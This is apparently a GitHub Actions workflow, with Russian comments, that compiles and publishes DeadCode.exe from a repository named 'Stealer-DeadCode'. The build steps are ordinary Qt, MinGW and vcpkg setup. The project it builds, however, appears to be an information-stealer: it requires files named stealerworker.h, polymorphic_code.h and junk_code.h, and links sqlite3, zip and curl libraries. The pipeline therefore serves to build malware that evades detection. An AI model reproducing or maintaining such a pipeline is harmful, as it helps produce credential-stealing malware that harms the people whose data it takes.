name: Build DeadCode

on:
  push:
    branches:
      - main
  workflow_dispatch:
    inputs:
      cache-buster:
        description: 'Cache buster'
        default: '1'

jobs:
  build-windows:
    runs-on: windows-latest
    timeout-minutes: 120

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4
      with:
        path: Stealer-DeadCode
        fetch-depth: 0

    - name: Setup Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.11'

    - name: Install Python dependencies for aqtinstall
      run: |
        Write-Host "Installing Python dependencies for aqtinstall..."
        python -m pip install --upgrade pip setuptools wheel py7zr==0.22.0
        python -m pip install aqtinstall==3.1.*
        python -m aqt version
      shell: pwsh

    - name: Check available Qt modules
      run: |
        Write-Host "Checking available Qt versions and architectures..."
        python -m aqt list-qt windows desktop
        Write-Host "Checking available architectures for Qt 5.15.2..."
        python -m aqt list-qt windows desktop --arch 5.15.2
        Write-Host "Checking available modules for Qt 5.15.2 with win64_mingw81..."
        python -m aqt list-qt windows desktop --modules 5.15.2 win64_mingw81
        Write-Host "Checking available MinGW tools..."
        python -m aqt list-tool windows desktop tools_mingw
      shell: pwsh
      continue-on-error: true

    - name: Check disk space
      run: |
        Write-Host "Checking available disk space..."
        Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'" | Select-Object DeviceID, @{Name="FreeSpace(GB)";Expression={[math]::Round($_.FreeSpace/1GB,2)}}
      shell: pwsh

    - name: Install Qt 5.15.2 for win64_mingw81
      run: |
        Write-Host "Installing Qt 5.15.2 for win64_mingw81..."
        python -m aqt install-qt --outputdir C:\Qt windows desktop 5.15.2 win64_mingw81
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: Failed to install Qt 5.15.2"
          exit 1
        }
        Write-Host "Qt 5.15.2 installed successfully"
      shell: pwsh

    - name: Install MSYS2 and MinGW
      run: |
        Write-Host "Installing MSYS2 and MinGW..."
        choco install msys2 -y
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: Failed to install MSYS2 via Chocolatey"
          exit 1
        }
        Write-Host "Updating MSYS2 and installing MinGW..."
        C:\tools\msys64\usr\bin\bash -lc "pacman -Syu --noconfirm"
        C:\tools\msys64\usr\bin\bash -lc "pacman -S --noconfirm mingw-w64-x86_64-toolchain mingw-w64-x86_64-pcre2 mingw-w64-x86_64-zlib mingw-w64-x86_64-libpng mingw-w64-x86_64-libjpeg"
        Write-Host "Adding MinGW to PATH..."
        $env:Path += ";C:\tools\msys64\mingw64\bin"
        [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)
        Write-Host "PATH updated: $env:Path"
        Write-Host "Verifying MinGW installation..."
        g++ --version
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: g++ --version failed"
          exit 1
        }
        mingw32-make --version
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: mingw32-make --version failed"
          exit 1
        }
      shell: pwsh

    - name: Verify Qt installation
      run: |
        Write-Host "Verifying Qt installation..."
        $qmakePath = "C:/Qt/5.15.2/mingw81_64/bin/qmake.exe"
        $uicPath = "C:/Qt/5.15.2/mingw81_64/bin/uic.exe"
        $makePath = "C:/tools/msys64/mingw64/bin/mingw32-make.exe"
        $gppPath = "C:/tools/msys64/mingw64/bin/g++.exe"
        if (-not (Test-Path $qmakePath)) {
          Write-Host "Error: qmake.exe not found at $qmakePath"
          dir C:/Qt -Recurse
          exit 1
        }
        if (-not (Test-Path $uicPath)) {
          Write-Host "Error: uic.exe not found at $uicPath"
          dir C:/Qt -Recurse
          exit 1
        }
        if (-not (Test-Path $makePath)) {
          Write-Host "Error: mingw32-make.exe not found at $makePath"
          dir C:/tools/msys64 -Recurse
          exit 1
        }
        if (-not (Test-Path $gppPath)) {
          Write-Host "Error: g++.exe not found at $gppPath"
          dir C:/tools/msys64 -Recurse
          exit 1
        }
        $env:Path += ";C:/Qt/5.15.2/mingw81_64/bin;C:/tools/msys64/mingw64/bin"
        [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)
        Write-Host "PATH: $env:Path"
        Write-Host "Verifying qmake..."
        & $qmakePath --version
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: qmake --version failed"
          exit 1
        }
        Write-Host "Verifying mingw32-make..."
        & $makePath --version
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: mingw32-make --version failed"
          exit 1
        }
        Write-Host "Verifying g++..."
        & $gppPath --version
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: g++ --version failed"
          exit 1
        }
        Write-Host "Qt and MinGW installation completed and verified"
      shell: pwsh

    - name: Cache vcpkg
      uses: actions/cache@v4
      with:
        path: C:/vcpkg
        key: vcpkg-${{ hashFiles('**/vcpkg.json') }}-${{ github.event.inputs.cache-buster || '1' }}
        restore-keys: |
          vcpkg-

    - name: Update vcpkg
      run: |
        if (-not (Test-Path C:/vcpkg)) {
          Write-Host "Cloning vcpkg..."
          git clone https://github.com/microsoft/vcpkg.git C:/vcpkg
        } else {
          Write-Host "vcpkg directory already exists, updating..."
          cd C:/vcpkg
          git pull
        }
        Write-Host "Running bootstrap-vcpkg..."
        & C:/vcpkg/bootstrap-vcpkg.bat -disableMetrics
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: Bootstrap failed. Check the logs."
          exit 1
        }
        Write-Host "vcpkg version after bootstrap:"
        & C:/vcpkg/vcpkg.exe --version
      shell: pwsh

    - name: Ensure write permissions for vcpkg build directory
      run: |
        Write-Host "Ensuring write permissions for vcpkg build directory..."
        New-Item -Path "C:/vcpkg/buildtrees" -ItemType Directory -Force
        icacls "C:\vcpkg\buildtrees" /grant "Everyone:F" /T
      shell: pwsh

    - name: Install vcpkg dependencies
      env:
        VCPKG_MAX_CONCURRENCY: 1  # Отключаем параллельную сборку
      run: |
        Write-Host "Installing vcpkg dependencies with triplet x64-mingw-static..."
        $vcpkgExe = "C:/vcpkg/vcpkg.exe"
        $env:Path += ";C:/vcpkg"
        [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)
        & $vcpkgExe install sqlite3 libzip zlib bzip2 curl openssl --triplet x64-mingw-static --clean-after-build --debug 2>&1 | Tee-Object -FilePath "Stealer-DeadCode/vcpkg_install.log"
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: vcpkg install failed. Check vcpkg_install.log for details."
          Get-Content Stealer-DeadCode/vcpkg_install.log
          exit 1
        }
        Write-Host "vcpkg installation completed successfully"
      shell: pwsh

    - name: Verify vcpkg installation
      run: |
        $libDir = "C:/vcpkg/installed/x64-mingw-static/lib"
        $includeDir = "C:/vcpkg/installed/x64-mingw-static/include"
        $libs = @("libsqlite3.a", "libzip.a", "libzlib.a", "libbz2.a", "libcurl.a", "libssl.a", "libcrypto.a")
        $headers = @("sqlite3.h", "zip.h", "zlib.h", "bzlib.h", "curl/curl.h", "openssl/ssl.h", "openssl/crypto.h")
        $missing = @()
        foreach ($lib in $libs) {
          if (-not (Test-Path "$libDir/$lib")) {
            $missing += "$lib"
          }
        }
        foreach ($header in $headers) {
          if (-not (Test-Path "$includeDir/$header")) {
            $missing += $header
          }
        }
        if ($missing) {
          Write-Host "Error: Missing libraries or header files: $missing"
          dir $libDir
          dir $includeDir
          dir "$includeDir/curl"
          dir "$includeDir/openssl"
          exit 1
        }
        Write-Host "All vcpkg dependencies verified"
      shell: pwsh

    - name: Verify project structure
      run: |
        cd Stealer-DeadCode
        Write-Host "Current directory: $(Get-Location)"
        $requiredFiles = @(
          "ui/DeadCode.pro",
          "src/main.cpp",
          "ui/mainwindow.ui",
          "ui/mainwindow.cpp",
          "ui/mainwindow.h",
          "src/build_key.h",
          "src/polymorphic_code.h",
          "src/junk_code.h",
          "src/stealerworker.h"
        )
        $missingFiles = @()
        foreach ($file in $requiredFiles) {
          if (-not (Test-Path $file)) {
            $missingFiles += $file
          }
        }
        if ($missingFiles) {
          Write-Host "Error: Missing required files: $missingFiles"
          dir ui -ErrorAction SilentlyContinue
          dir src -ErrorAction SilentlyContinue
          exit 1
        }
        Write-Host "Creating build and release directories..."
        New-Item -Path build -ItemType Directory -Force
        New-Item -Path release -ItemType Directory -Force
        Write-Host "Verifying write access to directories..."
        "Test write access" | Out-File -FilePath "build/test_write.txt"
        "Test write access" | Out-File -FilePath "release/test_write.txt"
        Remove-Item "build/test_write.txt", "release/test_write.txt"
        Write-Host "Project structure verified"
      shell: pwsh

    - name: Verify and generate UI files
      run: |
        cd Stealer-DeadCode
        Write-Host "Generating ui_mainwindow.h..."
        $uicPath = "C:/Qt/5.15.2/mingw81_64/bin/uic.exe"
        if (-not (Test-Path $uicPath)) {
          Write-Host "Error: uic.exe not found at $uicPath"
          exit 1
        }
        & $uicPath ui/mainwindow.ui -o release/ui_mainwindow.h 2>&1 | Tee-Object -FilePath "uic_output.log"
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: uic.exe failed. Check uic_output.log for details."
          Get-Content uic_output.log
          exit 1
        }
        if (-not (Test-Path release/ui_mainwindow.h)) {
          Write-Host "Error: ui_mainwindow.h was not generated"
          exit 1
        }
        Write-Host "ui_mainwindow.h generated successfully"
      shell: pwsh

    - name: Configure and build DeadCode
      run: |
        cd Stealer-DeadCode
        Write-Host "Setting up environment..."
        $env:Path += ";C:/Qt/5.15.2/mingw81_64/bin;C:/vcpkg;C:/tools/msys64/mingw64/bin"
        [System.Environment]::SetEnvironmentVariable("Path", $env:Path, [System.EnvironmentVariableTarget]::Process)
        Write-Host "Updated PATH: $env:Path"
        
        # Переходим в каталог build и указываем путь к DeadCode.pro
        cd build
        Write-Host "Running qmake..."
        C:/Qt/5.15.2/mingw81_64/bin/qmake.exe ../ui/DeadCode.pro CONFIG+=static CONFIG+=staticlib 2>&1 | Tee-Object -FilePath "../qmake_output.log"
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: qmake failed. Check qmake_output.log for details."
          Get-Content ../qmake_output.log
          exit 1
        }
        
        # Проверяем, созданы ли Makefile, Makefile.Debug и Makefile.Release
        Write-Host "Checking for generated Makefiles..."
        if (-not (Test-Path Makefile)) {
          Write-Host "Error: Makefile was not generated"
          dir .
          exit 1
        }
        if (-not (Test-Path Makefile.Debug)) {
          Write-Host "Error: Makefile.Debug was not generated"
          dir .
          exit 1
        }
        if (-not (Test-Path Makefile.Release)) {
          Write-Host "Error: Makefile.Release was not generated"
          dir .
          exit 1
        }
        Write-Host "Makefiles generated successfully"
        
        # Запускаем mingw32-make в каталоге build
        Write-Host "Running mingw32-make..."
        C:/tools/msys64/mingw64/bin/mingw32-make.exe -f Makefile.Release -j1 2>&1 | Tee-Object -FilePath "../make_output.log"
        if ($LASTEXITCODE -ne 0) {
          Write-Host "Error: mingw32-make failed. Check make_output.log for details."
          Get-Content ../make_output.log
          exit 1
        }
        
        # Проверяем, создан ли DeadCode.exe
        if (-not (Test-Path release/DeadCode.exe)) {
          Write-Host "Error: DeadCode.exe was not generated"
          dir release
          exit 1
        }
        Write-Host "Build completed successfully"
      shell: pwsh

    - name: Upload build logs
      if: failure()
      uses: actions/upload-artifact@v4
      with:
        name: build-logs
        path: |
          Stealer-DeadCode/qmake_output.log
          Stealer-DeadCode/make_output.log
          Stealer-DeadCode/uic_output.log
          Stealer-DeadCode/vcpkg_install.log
        if-no-files-found: warn

    - name: Upload artifact
      uses: actions/upload-artifact@v4
      with:
        name: DeadCode-Build
        path: Stealer-DeadCode/build/release/DeadCode.exe
        if-no-files-found: error

    - name: Cleanup
      if: always()
      run: |
        Remove-Item -Path "Stealer-DeadCode/build" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "Stealer-DeadCode/release" -Recurse -Force -ErrorAction SilentlyContinue
      shell: pwsh